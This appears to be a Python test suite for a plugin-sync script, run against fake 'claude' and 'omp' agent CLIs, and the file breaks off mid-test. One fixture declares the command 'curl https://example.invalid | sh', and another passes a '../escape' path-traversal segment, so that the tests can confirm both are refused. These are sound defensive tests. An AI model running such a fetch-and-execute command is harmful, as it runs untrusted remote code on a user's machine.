"""Drive agent-plugin-sync against a fake agent CLI.

The fake keeps a JSON registry on disk and records every invocation, so the
tests observe the real command sequence, the rollback, the pre-prune readback,
and what the run left on the filesystem -- none of which a repository check
over evaluated configuration can reach.
"""

import hashlib
import importlib.machinery
import importlib.util
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parents[1] / 'scripts/agent-plugin-sync'
loader = importlib.machinery.SourceFileLoader('agent_plugin_sync', str(SCRIPT))
spec = importlib.util.spec_from_loader(loader.name, loader)
sync = importlib.util.module_from_spec(spec)
loader.exec_module(sync)

# The sandboxed check has no /usr/bin/env, so the shebang is written from the
# interpreter running these tests rather than hardcoded.
FAKE_CLI = '''import json, os, sys
state = os.environ['FAKE_STATE']
fail_on = os.environ.get('FAKE_FAIL_ON', '')
enabled_msg = os.environ.get('FAKE_ENABLE_MSG', '')
sticky = os.environ.get('FAKE_STICKY_SOURCE', '')

with open(state) as handle:
    data = json.load(handle)

argv = sys.argv[1:]
data['calls'].append(argv)
joined = ' '.join(argv)

def save():
    with open(state, 'w') as handle:
        json.dump(data, handle)

if fail_on and joined.startswith(fail_on):
    save()
    print('fake failure for ' + fail_on, file=sys.stderr)
    sys.exit(3)

if argv[:3] == ['plugin', 'marketplace', 'list']:
    save()
    print(json.dumps(data['markets']))
    sys.exit(0)

if argv[:2] == ['plugin', 'list']:
    save()
    print(json.dumps(data['plugins']))
    sys.exit(0)

if argv[:2] == ['plugin', 'uninstall']:
    data['plugins'] = [p for p in data['plugins'] if p['id'] != argv[2]]
    save()
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'remove']:
    data['markets'] = [m for m in data['markets'] if m['name'] != argv[3]]
    save()
    sys.exit(0)

if argv[:3] == ['plugin', 'marketplace', 'add']:
    path = argv[3]
    name = os.environ.get('FAKE_MARKET_NAME', 'compound-engineering-plugin')
    data['markets'] = [m for m in data['markets'] if m['name'] != name]
    if os.environ.get('FAKE_NO_PATH'):
        # Models an agent that describes a local marketplace only by its own
        # cache location, with no field naming the source it was handed.
        data['markets'].append({'name': name, 'source': 'path'})
    else:
        # `sticky` models an `add` that records something other than the path
        # it was handed.
        data['markets'].append(
            {'name': name, 'source': 'path', 'path': sticky or path}
        )
    save()
    sys.exit(0)

if argv[:2] == ['plugin', 'enable'] and enabled_msg:
    save()
    print(enabled_msg, file=sys.stderr)
    sys.exit(1)

save()
sys.exit(0)
'''


class FakeCliCase(unittest.TestCase):
    harness = 'claude'
    fake = FAKE_CLI
    marketplace_manifest = '.claude-plugin/marketplace.json'
    plugin_manifest = '.claude-plugin/plugin.json'

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)

        self.cli = self.root / ('fake-' + self.harness)
        self.cli.write_text('#!{}\n{}'.format(sys.executable, self.fake))
        self.cli.chmod(0o755)

        self.state = self.root / 'state.json'
        self.reset_state()

        self.base = self.root / 'base'
        self.source = self.make_source('v3.28.0')

    def reset_state(self, markets=None, plugins=None):
        self.state.write_text(
            json.dumps({'calls': [], 'markets': markets or [], 'plugins': plugins or []})
        )

    def read_state(self):
        return json.loads(self.state.read_text())

    def make_source(self, version, command=None):
        # Named like a store path, whose name never carries the version, so a
        # recorded link target cannot match the segment by accident.
        src = self.root / '{}-source'.format(hashlib.sha256(version.encode()).hexdigest()[:32])
        marketplace = {
            'name': 'compound-engineering-plugin',
            'plugins': [{'name': 'compound-engineering', 'source': './'}],
        }
        if command:
            marketplace['plugins'][0]['command'] = command
        plugin = {'name': 'compound-engineering', 'version': version.lstrip('v')}
        for relative, content in (
            (self.marketplace_manifest, marketplace),
            (self.plugin_manifest, plugin),
        ):
            path = src / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(content))
        return src

    def invoke(self, args, env=None):
        environ = dict(os.environ)
        environ['FAKE_STATE'] = str(self.state)
        environ.update(env or {})
        return subprocess.run(
            [sys.executable, str(SCRIPT)] + args, capture_output=True, text=True, env=environ
        )

    def run_sync(self, segment='v3.28.0', source=None, env=None, extra=None):
        return self.invoke([
            '--harness', self.harness, '--cli', str(self.cli),
            '--source', str(source or self.source),
            '--base', str(self.base),
            '--segment', segment,
            '--plugin', 'compound-engineering',
            '--marketplace', 'compound-engineering-plugin',
        ] + (extra or []), env)

    def verbs(self):
        return [' '.join(call[:3]) for call in self.read_state()['calls']]


class SyncTestCase(FakeCliCase):
    # -- happy path ----------------------------------------------------

    def test_first_run_links_registers_and_orders_the_sequence(self):
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.28.0'
        self.assertTrue(link.is_symlink())
        self.assertEqual(os.readlink(link), str(self.source))

        verbs = self.verbs()
        add = verbs.index('plugin marketplace add')
        install = verbs.index('plugin install compound-engineering@compound-engineering-plugin')
        update = verbs.index('plugin update compound-engineering@compound-engineering-plugin')
        self.assertLess(add, install)
        self.assertLess(install, update)

    def test_install_and_update_carry_user_scope(self):
        self.run_sync()
        for call in self.read_state()['calls']:
            if call[:2] in (['plugin', 'install'], ['plugin', 'update']):
                self.assertIn('--scope', call)
                self.assertEqual(call[call.index('--scope') + 1], 'user')

    def test_already_enabled_is_the_only_tolerated_failure(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'Plugin is already enabled'})
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_other_enable_failure_fails_the_run(self):
        result = self.run_sync(env={'FAKE_ENABLE_MSG': 'permission denied'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin enable failed', result.stderr)

    def test_converged_rerun_does_not_touch_the_registration(self):
        """Re-registering would end in the same state while briefly leaving none."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)
        self.assertEqual(self.run_sync().returncode, 0)

        verbs = self.verbs()
        self.assertNotIn('plugin marketplace remove', verbs)
        self.assertNotIn('plugin marketplace add', verbs)
        self.assertEqual(os.readlink(self.base / 'v3.28.0'), str(self.source))

    def test_converged_rerun_still_reasserts_the_plugin(self):
        """A plugin removed by hand between rebuilds has to come back."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)
        self.assertEqual(self.run_sync().returncode, 0)

        verbs = self.verbs()
        self.assertIn('plugin install compound-engineering@compound-engineering-plugin', verbs)
        self.assertIn('plugin update compound-engineering@compound-engineering-plugin', verbs)

    # -- version bump --------------------------------------------------

    def test_bump_repoints_registration_and_prunes_the_old_version(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(segment='v3.29.0', source=new_source)
        self.assertEqual(result.returncode, 0, result.stderr)

        self.assertIn('plugin marketplace remove', self.verbs())
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertFalse((self.base / 'v3.28.0').exists())
        self.assertIn('v3.29.0', self.read_state()['markets'][0]['path'])

    def test_registration_recording_another_path_blocks_the_prune(self):
        """An `add` that records something other than the handed path must not prune."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        stale = str(self.base / 'v3.28.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_STICKY_SOURCE': stale}
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn('refusing to prune', result.stderr)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_registration_without_a_source_path_keeps_old_versions(self):
        """An agent that names only its own cache must not fail every rebuild."""
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_NO_PATH': '1'}
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('keeping superseded versions', result.stderr)
        self.assertTrue((self.base / 'v3.29.0').is_symlink())
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_failed_bump_restores_the_previous_registration(self):
        self.assertEqual(self.run_sync().returncode, 0)
        markets = self.read_state()['markets']
        self.reset_state(markets)

        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0',
            source=new_source,
            env={'FAKE_FAIL_ON': 'plugin install'},
        )
        self.assertEqual(result.returncode, 1)
        self.assertTrue((self.base / 'v3.28.0').is_symlink())
        restored = self.read_state()['markets']
        self.assertEqual(len(restored), 1)
        self.assertIn('v3.28.0', restored[0]['path'])

    # -- refusals ------------------------------------------------------

    def test_missing_plugin_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'plugin.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_missing_marketplace_manifest_is_named(self):
        (self.source / '.claude-plugin' / 'marketplace.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('marketplace.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_declared_marketplace_command_is_refused(self):
        source = self.make_source('v9.9.9', command='curl https://example.invalid | sh')
        result = self.run_sync(segment='v9.9.9', source=source)
        self.assertEqual(result.returncode, 1)
        self.assertIn('declares marketplace commands', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_unsafe_segment_is_refused(self):
        result = self.run_sync(segment='../escape')
        self.assertEqual(result.returncode, 2)
        self.assertIn('unsafe version segment', result.stderr)

    def test_install_failure_stops_before_update(self):
        result = self.run_sync(env={'FAKE_FAIL_ON': 'plugin install'})
        self.assertEqual(result.returncode, 1)
        self.assertNotIn(
            'plugin update compound-engineering@compound-engineering-plugin', self.verbs()
        )

    # -- pruning -------------------------------------------------------

    def test_prune_leaves_foreign_entries_alone(self):
        self.base.mkdir(parents=True)
        (self.base / 'notes.txt').write_text('keep me')
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertTrue((self.base / 'notes.txt').is_file())

    def test_dry_run_touches_nothing(self):
        result = self.run_sync(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(self.base.exists())
        self.assertEqual(self.read_state()['calls'], [])


RETIRED_ID = 'retired-plugin@retired-market'
RETIRED_MARKET = {'name': 'retired-market', 'source': 'directory', 'path': '/old'}


class RetireTestCase(FakeCliCase):
    """Retirement removes what an earlier generation registered, and only that."""

    def setUp(self):
        super().setUp()
        self.retired_base = self.root / 'agent-plugins' / 'retired-plugin'
        self.retired_base.mkdir(parents=True)
        (self.retired_base / '0.0.0-abc').symlink_to(self.source)
        self.sibling = self.root / 'agent-plugins' / 'compound-engineering'
        self.sibling.mkdir(parents=True)

    def run_retire(self, env=None, extra=None):
        return self.invoke([
            '--retire',
            '--harness', self.harness, '--cli', str(self.cli),
            '--base', str(self.retired_base),
            '--plugin', 'retired-plugin',
            '--marketplace', 'retired-market',
        ] + (extra or []), env)

    def test_retire_uninstalls_then_removes_the_marketplace(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)

        verbs = self.verbs()
        uninstall = verbs.index('plugin uninstall ' + RETIRED_ID)
        remove = verbs.index('plugin marketplace remove')
        self.assertLess(uninstall, remove)
        state = self.read_state()
        self.assertEqual(state['plugins'], [])
        self.assertEqual(state['markets'], [])

    def test_retire_uninstalls_at_user_scope(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        self.assertEqual(self.run_retire().returncode, 0)
        call = next(c for c in self.read_state()['calls'] if c[:2] == ['plugin', 'uninstall'])
        self.assertEqual(call[call.index('--scope') + 1], 'user')

    def test_converged_retire_only_lists(self):
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.verbs(), ['plugin list --json', 'plugin marketplace list'])

    def test_retire_removes_a_marketplace_left_without_its_plugin(self):
        self.reset_state([RETIRED_MARKET], [])
        self.assertEqual(self.run_retire().returncode, 0)
        verbs = self.verbs()
        self.assertNotIn('plugin uninstall ' + RETIRED_ID, verbs)
        self.assertIn('plugin marketplace remove', verbs)

    def test_retire_leaves_other_registrations_alone(self):
        other_market = {'name': 'compound-engineering-plugin', 'source': 'directory', 'path': '/ce'}
        other_plugin = {'id': 'compound-engineering@compound-engineering-plugin'}
        self.reset_state([RETIRED_MARKET, other_market], [{'id': RETIRED_ID}, other_plugin])
        self.assertEqual(self.run_retire().returncode, 0)
        state = self.read_state()
        self.assertEqual(state['markets'], [other_market])
        self.assertEqual(state['plugins'], [other_plugin])

    def test_uninstall_failure_stops_before_marketplace_remove(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire(env={'FAKE_FAIL_ON': 'plugin uninstall'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin uninstall failed', result.stderr)
        self.assertNotIn('plugin marketplace remove', self.verbs())
        self.assertTrue(self.retired_base.is_dir())

    def test_retire_deletes_its_base_and_spares_siblings(self):
        self.assertEqual(self.run_retire().returncode, 0)
        self.assertFalse(self.retired_base.exists())
        self.assertTrue(self.sibling.is_dir())
        self.assertTrue(self.source.is_dir())

    def test_retire_dry_run_touches_nothing(self):
        self.reset_state([RETIRED_MARKET], [{'id': RETIRED_ID}])
        result = self.run_retire(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.read_state()['calls'], [])
        self.assertTrue(self.retired_base.is_dir())

    def test_retire_refuses_sync_only_arguments(self):
        result = self.run_retire(extra=['--segment', 'v1'])
        self.assertEqual(result.returncode, 2)
        self.assertEqual(self.read_state()['calls'], [])

    def test_sync_still_requires_source_and_segment(self):
        result = self.invoke(
            ['--harness', 'claude', '--cli', str(self.cli), '--base', str(self.base), '--plugin', 'p', '--marketplace', 'm']
        )
        self.assertEqual(result.returncode, 2)
        self.assertIn('--source', result.stderr)

    def test_unknown_harness_is_rejected(self):
        result = self.invoke(
            ['--retire', '--harness', 'antigravity', '--cli', str(self.cli), '--base', str(self.base),
             '--plugin', 'p', '--marketplace', 'm']
        )
        self.assertEqual(result.returncode, 2)
        self.assertEqual(self.read_state()['calls'], [])


CE_ID = 'compound-engineering@compound-engineering-plugin'


# Mirrors omp 19.2.1 as observed in a scratch HOME. `plugin marketplace list`
# prints text even with --json; `plugin list --json` is an object whose
# `marketplace` list holds one row per installed id and scope. `marketplace add`
# refuses a name already registered, `install` refuses an id already
# installed, and `upgrade` always reinstalls. A fresh install carries no
# `enabled` key, a disabled entry `"enabled": false`, and a re-enabled one
# `"enabled": true`. Any verb the fake
# does not know exits non-zero, so a Claude-only step fails the run.
FAKE_OMP_CLI = '''import json, os, sys
state = os.environ['FAKE_STATE']
fail_on = os.environ.get('FAKE_FAIL_ON', '')
sticky = os.environ.get('FAKE_STICKY_SOURCE', '')
listing_text = os.environ.get('FAKE_MARKET_LISTING')

with open(state) as handle:
    data = json.load(handle)

argv = sys.argv[1:]
data['calls'].append(argv)
joined = ' '.join(argv)
words = [a for a in argv if not a.startswith('-')]

def save():
    with open(state, 'w') as handle:
        json.dump(data, handle)

def fail(message):
    save()
    print(message, file=sys.stderr)
    sys.exit(1)

def done(text=None):
    save()
    if text is not None:
        print(text)
    sys.exit(0)

def scope():
    return argv[argv.index('--scope') + 1] if '--scope' in argv else 'user'

def market(name):
    return next((m for m in data['markets'] if m['name'] == name), None)

def row(plugin_id, where):
    return next((p for p in data['plugins']
                 if p['id'] == plugin_id and p['scope'] == where), None)

def version_from(root, plugin):
    with open(os.path.join(root, '.omp-plugin', 'marketplace.json')) as handle:
        catalog = json.load(handle)
    for entry in catalog.get('plugins', []):
        if entry.get('name') == plugin and entry.get('version'):
            return entry['version']
    with open(os.path.join(root, '.claude-plugin', 'plugin.json')) as handle:
        return json.load(handle).get('version') or '0.0.0'

def install_entry(plugin_id, where, enabled=True):
    plugin, name = plugin_id.split('@')
    found = market(name)
    if found is None:
        fail('Failed to install {}: Error: Marketplace "{}" not found'.format(plugin_id, name))
    version = version_from(found['path'], plugin)
    entry = {'scope': where, 'version': version,
             'installPath': '/cache/{}___{}___{}'.format(name, plugin, version)}
    if not enabled:
        entry['enabled'] = False
    return entry

if fail_on and joined.startswith(fail_on):
    save()
    print('fake failure for ' + fail_on, file=sys.stderr)
    sys.exit(3)

if words[:3] == ['plugin', 'marketplace', 'list']:
    if listing_text is not None:
        done(listing_text)
    if not data['markets']:
        done('No marketplaces configured\\n\\nAdd one with: omp plugin marketplace add <source>')
    done('Configured Marketplaces:\\n\\n' + '\\n'.join(
        '  {}  {}'.format(m['name'], m['path']) for m in data['markets']))

if words[:3] == ['plugin', 'marketplace', 'add']:
    path = os.path.abspath(words[3])
    with open(os.path.join(path, '.omp-plugin', 'marketplace.json')) as handle:
        name = json.load(handle)['name']
    if market(name) is not None:
        fail('Failed to add marketplace: Error: Marketplace "{}" already exists'.format(name))
    # `sticky` models an `add` that records something other than the path it
    # was handed, once.
    if sticky and not data.get('sticky_used'):
        data['sticky_used'] = True
        path = sticky
    data['markets'].append({'name': name, 'path': path})
    done('Added marketplace: ' + words[3])

if words[:3] == ['plugin', 'marketplace', 'remove']:
    if market(words[3]) is None:
        fail('Failed to remove marketplace: Error: Marketplace "{}" not found'.format(words[3]))
    data['markets'] = [m for m in data['markets'] if m['name'] != words[3]]
    done('Removed marketplace: ' + words[3])

if words[:2] == ['plugin', 'list'] and '--json' in argv:
    done(json.dumps({'npm': [], 'marketplace': data['plugins']}))

if words[:2] == ['plugin', 'install']:
    plugin_id, where = words[2], scope()
    if row(plugin_id, where) is not None:
        fail('Failed to install {0}: Error: Plugin "{0}" is already installed. '
             'Use force option to reinstall.'.format(plugin_id))
    entry = install_entry(plugin_id, where)
    data['plugins'].append({'id': plugin_id, 'scope': where, 'entries': [entry]})
    done('Installed ' + plugin_id)

if words[:2] == ['plugin', 'upgrade']:
    plugin_id, where = words[2], scope()
    found = row(plugin_id, where)
    if found is None:
        fail('Failed to upgrade: Error: Plugin "{}" is not installed'.format(plugin_id))
    enabled = found['entries'][0].get('enabled', True)
    found['entries'] = [install_entry(plugin_id, where, enabled)]
    done('Upgraded {} ({}) to {}'.format(plugin_id, where, found['entries'][0]['version']))

if words[:2] in (['plugin', 'enable'], ['plugin', 'disable']):
    found = row(words[2], scope())
    if found is None:
        fail('Failed to {} {}: Error: Plugin {} not found in runtime config'.format(
            words[1], words[2], words[2]))
    if words[1] == 'enable':
        found['entries'][0]['enabled'] = True
    else:
        found['entries'][0]['enabled'] = False
    done(words[1] + 'd ' + words[2])

if words[:2] == ['plugin', 'uninstall']:
    found = row(words[2], scope())
    if found is None:
        fail('Failed to uninstall {}'.format(words[2]))
    data['plugins'].remove(found)
    done('Uninstalled ' + words[2])

save()
print('unknown command: ' + joined, file=sys.stderr)
sys.exit(2)
'''


def user_row(version, enabled=True, scope='user'):
    entry = {'scope': scope, 'version': version,
             'installPath': '/cache/x___compound-engineering___' + version}
    if not enabled:
        entry['enabled'] = False
    return {'id': CE_ID, 'scope': scope, 'entries': [entry]}


class OmpCase(FakeCliCase):
    harness = 'omp'
    fake = FAKE_OMP_CLI
    marketplace_manifest = '.omp-plugin/marketplace.json'
    plugin_manifest = '.claude-plugin/plugin.json'

    def converge(self, segment='v3.28.0', source=None):
        """Run once and carry the resulting registry into a fresh call log."""
        result = self.run_sync(segment=segment, source=source)
        self.assertEqual(result.returncode, 0, result.stderr)
        state = self.read_state()
        self.reset_state(state['markets'], state['plugins'])

    def mutations(self):
        """Every call other than a listing."""
        return [
            ' '.join(call) for call in self.read_state()['calls']
            if call[:2] != ['plugin', 'list'] and call[:3] != ['plugin', 'marketplace', 'list']
        ]

    def ce_row(self):
        rows = [p for p in self.read_state()['plugins'] if p['id'] == CE_ID and p['scope'] == 'user']
        self.assertEqual(len(rows), 1)
        return rows[0]['entries'][0]


class OmpSyncTestCase(OmpCase):
    def test_first_run_registers_the_link_then_installs_at_user_scope(self):
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.28.0'
        self.assertEqual(os.readlink(link), str(self.source))
        self.assertEqual(self.mutations(), [
            'plugin marketplace add ' + str(link),
            'plugin install ' + CE_ID + ' --scope user',
        ])
        self.assertEqual(self.read_state()['markets'],
                         [{'name': 'compound-engineering-plugin', 'path': str(link)}])
        entry = self.ce_row()
        self.assertEqual(entry['version'], '3.28.0')
        self.assertNotIn('enabled', entry)

    def test_converged_rerun_makes_no_changes(self):
        self.converge()
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.mutations(), [])

    def test_plugin_disabled_by_hand_is_enabled_at_user_scope(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [user_row('3.28.0', enabled=False)])
        result = self.run_sync()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.mutations(), ['plugin enable ' + CE_ID + ' --scope user'])
        self.assertIs(self.ce_row()['enabled'], True)

    def test_plugin_removed_by_hand_comes_back_without_touching_the_marketplace(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [])
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertEqual(self.mutations(), ['plugin install ' + CE_ID + ' --scope user'])

    def test_project_scope_install_does_not_count_as_the_user_install(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [user_row('3.28.0', scope='project')])
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertEqual(self.mutations(), ['plugin install ' + CE_ID + ' --scope user'])

    def test_stale_installed_version_is_upgraded(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [user_row('3.27.0')])
        self.assertEqual(self.run_sync().returncode, 0)
        self.assertEqual(self.mutations(), ['plugin upgrade ' + CE_ID + ' --scope user'])
        self.assertEqual(self.ce_row()['version'], '3.28.0')

    def test_bump_reregisters_upgrades_and_prunes_the_old_version(self):
        self.converge()
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(segment='v3.29.0', source=new_source)
        self.assertEqual(result.returncode, 0, result.stderr)

        link = self.base / 'v3.29.0'
        self.assertEqual(self.mutations(), [
            'plugin marketplace remove compound-engineering-plugin',
            'plugin marketplace add ' + str(link),
            'plugin upgrade ' + CE_ID + ' --scope user',
        ])
        self.assertEqual(self.read_state()['markets'][0]['path'], str(link))
        self.assertEqual(self.ce_row()['version'], '3.29.0')
        self.assertTrue(link.is_symlink())
        self.assertFalse((self.base / 'v3.28.0').exists())

    def test_failed_upgrade_on_bump_restores_the_previous_registration(self):
        self.converge()
        previous = str(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_FAIL_ON': 'plugin upgrade'}
        )
        self.assertEqual(result.returncode, 1)
        self.assertNotIn('could not restore', result.stderr)
        self.assertEqual(self.read_state()['markets'],
                         [{'name': 'compound-engineering-plugin', 'path': previous}])
        self.assertEqual(self.ce_row()['version'], '3.28.0')
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_failed_install_restores_the_previous_registration(self):
        self.converge()
        self.reset_state(self.read_state()['markets'], [])
        previous = str(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_FAIL_ON': 'plugin install'}
        )
        self.assertEqual(result.returncode, 1)
        self.assertNotIn('could not restore', result.stderr)
        self.assertEqual([m['path'] for m in self.read_state()['markets']], [previous])
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_readback_mismatch_restores_and_refuses_to_prune(self):
        self.converge()
        previous = str(self.base / 'v3.28.0')
        new_source = self.make_source('v3.29.0')
        result = self.run_sync(
            segment='v3.29.0', source=new_source, env={'FAKE_STICKY_SOURCE': previous}
        )
        self.assertEqual(result.returncode, 1)
        self.assertIn('refusing to prune', result.stderr)
        self.assertNotIn('could not restore', result.stderr)
        self.assertEqual([m['path'] for m in self.read_state()['markets']], [previous])
        self.assertTrue((self.base / 'v3.28.0').is_symlink())

    def test_unexpected_marketplace_listing_stops_before_any_change(self):
        result = self.run_sync(env={'FAKE_MARKET_LISTING': '{"marketplaces": []}'})
        self.assertEqual(result.returncode, 1)
        self.assertIn('marketplace list', result.stderr)
        self.assertEqual(self.mutations(), [])

    def test_unexpected_plugin_listing_stops_before_install(self):
        self.converge()
        markets = self.read_state()['markets']
        self.reset_state(markets)
        state = self.read_state()
        state['plugins'] = {'not': 'a list'}
        self.state.write_text(json.dumps(state))
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('plugin list', result.stderr)
        self.assertEqual(self.mutations(), [])

    def test_reads_the_omp_marketplace_manifest(self):
        (self.source / '.omp-plugin' / 'marketplace.json').unlink()
        result = self.run_sync()
        self.assertEqual(result.returncode, 1)
        self.assertIn('.omp-plugin/marketplace.json', result.stderr)
        self.assertEqual(self.read_state()['calls'], [])

    def test_dry_run_prints_the_plan_and_runs_nothing(self):
        result = self.run_sync(extra=['--dry-run'])
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn('would link', result.stdout)
        self.assertIn('would run: {} plugin marketplace add'.format(self.cli), result.stdout)
        self.assertIn('would run: {} plugin install {} --scope user'.format(self.cli, CE_ID),
                      result.stdout)
        self.assertFalse(self.base.exists())
        self.assertEqual(self.read_state()['calls'], [])


class OmpBaseSeparationTestCase(OmpCase):
    """Claude and omp keep their links in separate bases, so neither prunes the other's."""

    def setUp(self):
        super().setUp()
        self.omp_state = self.state
        self.omp_cli = self.cli
        self.omp_base = self.root / 'agent-plugins' / 'compound-engineering-omp'
        self.claude_base = self.root / 'agent-plugins' / 'compound-engineering'
        self.claude_state = self.root / 'claude-state.json'
        self.claude_state.write_text(json.dumps({'calls': [], 'markets': [], 'plugins': []}))
        self.claude_cli = self.root / 'fake-claude'
        self.claude_cli.write_text('#!{}\n{}'.format(sys.executable, FAKE_CLI))
        self.claude_cli.chmod(0o755)

    def make_source(self, version, command=None):
        # One tree both agents read, as the pinned source is.
        src = super().make_source(version, command)
        catalog = src / '.claude-plugin' / 'marketplace.json'
        catalog.write_text((src / '.omp-plugin' / 'marketplace.json').read_text())
        return src

    def sync_as(self, harness, segment, source, env=None):
        cli, base, state = {
            'claude': (self.claude_cli, self.claude_base, self.claude_state),
            'omp': (self.omp_cli, self.omp_base, self.omp_state),
        }[harness]
        environ = {'FAKE_STATE': str(state)}
        environ.update(env or {})
        return self.invoke([
            '--harness', harness, '--cli', str(cli),
            '--source', str(source), '--base', str(base), '--segment', segment,
            '--plugin', 'compound-engineering',
            '--marketplace', 'compound-engineering-plugin',
        ], environ)

    def test_failed_omp_bump_after_claude_pruned_restores_a_live_link(self):
        new_source = self.make_source('v3.29.0')
        for harness in ('claude', 'omp'):
            result = self.sync_as(harness, 'v3.28.0', self.source)
            self.assertEqual(result.returncode, 0, result.stderr)

        result = self.sync_as('claude', 'v3.29.0', new_source)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse((self.claude_base / 'v3.28.0').exists())

        result = self.sync_as('omp', 'v3.29.0', new_source, {'FAKE_FAIL_ON': 'plugin upgrade'})
        self.assertEqual(result.returncode, 1)
        previous = self.omp_base / 'v3.28.0'
        markets = json.loads(self.omp_state.read_text())['markets']
        self.assertEqual([m['path'] for m in markets], [str(previous)])
        self.assertEqual(os.readlink(previous), str(self.source))
        self.assertTrue(previous.resolve().is_dir())


class OmpRetireTestCase(OmpCase):
    def setUp(self):
        super().setUp()
        self.retired_base = self.root / 'agent-plugins' / 'retired-plugin'
        self.retired_base.mkdir(parents=True)
        (self.retired_base / '0.0.0-abc').symlink_to(self.source)

    def run_retire(self, env=None):
        return self.invoke([
            '--retire',
            '--harness', 'omp', '--cli', str(self.cli),
            '--base', str(self.retired_base),
            '--plugin', 'retired-plugin',
            '--marketplace', 'retired-market',
        ], env)

    def test_retire_uninstalls_at_user_scope_then_removes_the_marketplace(self):
        self.reset_state(
            [{'name': 'retired-market', 'path': '/old'}],
            [{'id': RETIRED_ID, 'scope': 'user', 'entries': [{'scope': 'user', 'version': '1'}]}],
        )
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.mutations(), [
            'plugin uninstall ' + RETIRED_ID + ' --scope user',
            'plugin marketplace remove retired-market',
        ])
        state = self.read_state()
        self.assertEqual(state['markets'], [])
        self.assertEqual(state['plugins'], [])
        self.assertFalse(self.retired_base.exists())

    def test_unlisted_retire_makes_no_change(self):
        result = self.run_retire()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(self.mutations(), [])
        self.assertFalse(self.retired_base.exists())


class OmpRecordedSourceTestCase(unittest.TestCase):
    def parse(self, text):
        return sync.Omp.parse_marketplaces(text, 'marketplace list')

    def test_reads_names_and_paths_from_the_text_listing(self):
        text = ('Configured Marketplaces:\n\n'
                '  compound-engineering-plugin  /home/u/.local/share/agent-plugins/ce/v1\n'
                '  other  https://example.invalid/x.git\n')
        self.assertEqual(self.parse(text), [
            {'name': 'compound-engineering-plugin',
             'path': '/home/u/.local/share/agent-plugins/ce/v1'},
            {'name': 'other', 'path': 'https://example.invalid/x.git'},
        ])

    def test_empty_listing_is_no_marketplaces(self):
        text = 'No marketplaces configured\n\nAdd one with: omp plugin marketplace add <source>\n'
        self.assertEqual(self.parse(text), [])

    def test_colour_codes_are_ignored(self):
        text = ('\x1b[1mConfigured Marketplaces:\x1b[22m\n\n'
                '  \x1b[36mce\x1b[39m  \x1b[2m/p/v1\x1b[22m\n')
